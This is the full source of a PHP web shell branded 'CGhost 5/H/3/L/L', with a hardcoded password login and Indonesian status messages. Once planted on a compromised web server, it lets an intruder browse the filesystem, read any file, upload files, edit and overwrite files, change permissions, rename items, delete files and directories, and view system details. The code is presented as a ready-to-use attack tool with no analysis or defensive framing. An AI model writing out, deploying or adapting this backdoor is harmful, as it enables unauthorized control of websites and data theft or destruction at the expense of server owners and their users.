<?php
@session_start(); 
@set_time_limit(0); 

//PASSWORD CONFIGURATION

@$pass = $_POST['pass']; 
$chk_login = true; 
$password = "cga";
//END CONFIGURATION 

if($pass == $password) 
{ 
 $_SESSION['nst'] = "$pass"; 
} 

if($chk_login == true) 
{ 
 if(!isset($_SESSION['nst']) or            $_SESSION['nst'] != $password) 
 { 
 die(" 
  <title>Login Dulu Bebz</title>
<link href='https://2.top4top.io/p_1384hlum50.jpg' rel='icon' type='image/x-icon'>
  <center> 
<body bgcolor=black>

<background-img:url
<tr><td><img src='https://2.top4top.io/p_1384hlum50.jpg' style='width:370px; height:370px;' border='3'>
  </center> 
  <form method=post>
  <center><input type=password name=pass size=25> 
  </form>  </center> 
  <font size=1 face=iceland color=green><strong><center>Host Target:</b> ".$_SERVER["HTTP_HOST"]."<br> 
  <font size=1 face=iceland color=green><strong><center>IP:</b> ".gethostbyname($_SERVER["HTTP_HOST"])."<br> 
  <font size=1 face=iceland color=grey><strong><center>My IP:<b> ".$_SERVER["REMOTE_ADDR"]." 
  </td></tr></table> 
  </td></tr></table>   </center> 
  ");
 }
}

error_reporting(0);
set_time_limit(0);
 
if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
echo '<!DOCTYPE HTML>
<html>
<head>
    <link href="https://fonts.googleapis.com/css?family=Black+Ops+One" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Merienda" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=anime+ace" rel="stylesheet" type="text/css">
<link href="https://fonts.googleapis.com/css?family=Sedgwick+Ave+Display" rel="stylesheet">
<title>5/H/3/L/L....?</title>
<style>
body{
font-family: Merienda;
background-color: black;
color: white;
}
#content tr:hover{
background-color: blue;
text-shadow:0px 0px 10px #fff;
}
#content .first{
background-color: red;
}
table{
border: 1px #000000;
}
a{
color:white;
font-size: 20px;
text-decoration:none;
}
a:hover{
color:green;
text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
border: 2px #000000 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
h1{
color:lime;
font-size:15px;
}
</style>
</head>
<body>
<center>
<img border="0" src="https://2.top4top.net/p_1384hlum50.jpg" width="540"><br>
<font face="Sedgwick Ave Display" color="white" style="text-shadow: 0 0 7px blue, 0 0 45px blue; font-weight:bold: blue; font-size:45px">[ CGhost 5/H/3/L/L]</font><br>
</h1></center>
<table width="960" border="1" cellpadding="0" cellspacing="0" align="center">
<tr><td>';
echo "<h5>
Host Target   :".$_SERVER['HTTP_HOST']."<br>
your IP    : ".$_SERVER['REMOTE_ADDR']."<br>
IP Server : ".gethostbyname($_SERVER['HTTP_HOST'])."<br>
system.   : ".php_uname()."</h5><br>";
echo '<table width="960" border="1" cellpadding="0" cellspacing="0" align="center">
<tr><td>';
echo "path : ";
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);
 
foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="lime">[+]Sukses Beebz :)</font><br/>';
}else{
echo '<font color="red">[+]Gagal bebz :(</font><br/>';
}
}
echo '<form enctype="multipart/form-data" method="POST">
<font color="white"><br><b>Upload :</font><input type="file" name="file"/>
<input type="submit" value="Upload" /><br>
</form>';
echo "</td></tr>";
echo "</table>";
echo "<center><table id='menu' width='960' border='2' cellpadding='3' cellspacing='0'><tr><td>";
echo "<center><b>
[ <a href='?'>Home</a> ]</b></center>
";
echo "</td></tr></table></center>";
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="lime">Change Perm bisa bebeb</font><br/>';
}else{
echo '<font color="red">Change Perm Gagal </font><br />';
}
}
echo '<form method="POST"><font face="Sedgwick Ave Display">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="lime">Rename berhasil Bebeb</font><br/>';
}else{
echo '<font color="red">Rename Gagal Sayang</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST"><font face="Sedgwick Ave Display">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="lime">berhasil Sayang</font><br/>';
}else{
echo '<font color="red">Maaf Beb Servernya Kek eek</font><br/>';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" />
</form>';
}
echo '</center>';
}else{
echo '</table><br/><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="lime">Directory Terdelete Sayang</font><br/>';
}else{
echo '<font color="red">Directory Gagal Terhapus Sayang                                                                                                                                                                                                                                                                                           </font><br/>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="lime">Terhapus Bebs</font><br/>';
}else{
echo '<font color="red">File Gagal Dihapus Sayang</font><br/>';
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="960" border="2" cellpadding="3" cellspacing="0" align="center">
<tr class="first">
<td><center><font color="black">N4m3</peller></center></td>
<td><center><font color="black">S1z3</peller></center></td>
<td><center><font color="black">P3rm15ion</peller></center></td>
<td><center><font color="black">4ct1on</peller></center></td>
</tr>';
 
foreach($scandir as $dir){
if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
echo '<tr>
<td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
<td><center>--</center></td>
<td><center>';
if(is_writable($path.'/'.$dir)) echo '<font color="aqua">';
elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
echo perms($path.'/'.$dir);
if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';
 
echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">RenaMe</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file($path.'/'.$file)) continue;
$size = filesize($path.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}
 
echo '<tr>
<td><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
<td><center>'.$size.'</center></td>
<td><center>';
if(is_writable($path.'/'.$file)) echo '<font color="aqua">';
elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
echo perms($path.'/'.$file);
if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
<option value="edit">Edit</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '</table>
</div>';
}
echo '<center><br/><font face="Sedgwick Ave Display" color="red" style="text-shadow: 0 0 20px blue, 0 0 5px blue, 0 0 7px blue, 0 0 45px blue; font-weight:bold: blue; font-size:35px">Recoded By MR_Hirarky</center>
</body>
</html>';
function perms($file){
$perms = fileperms($file);
 
if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}
 
// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));
 
// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));
 
// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));
 
return $info;
}
?>